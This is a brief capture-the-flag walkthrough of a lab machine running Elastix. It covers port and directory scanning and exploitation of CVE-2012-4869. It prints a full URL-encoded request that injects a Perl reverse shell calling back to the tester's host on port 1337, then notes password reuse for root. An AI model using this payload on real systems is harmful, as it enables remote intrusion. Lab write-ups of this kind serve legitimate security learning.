Started with a nmap scan
```
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/https? syn-ack ttl 63
993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
3306/tcp  open  mysql      syn-ack ttl 63 MySQL (unauthorized)
4445/tcp  open  upnotifyp? syn-ack ttl 63
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
```
Going to the webpage on port `80` it redirects to `https` the site on `443` is running `elastix` and we have webmin running on `10000` 
On port `443` I started running  a gobuster scan
```
/images
/help
/themes
/modules
/mail
/admin
/static
/lang
/robots.txt
/libs
```
Was looking for exploits for the webmin but all the ones are from `2012` and this box was made in `2017` and we need login creds which we don't have the `elastix` is vulnerable to `CVE-2012-4869` and looking up this exploit all we have to do is send a request to this url with are ip and port `/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.2%3a1337%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A`
and now we have a call back as `asterisk` ran linpeas and took me a while found a bunch of passwords and one of them worked for the root password `............` there is also a LFI we could of exploited to find this password before we even got user access 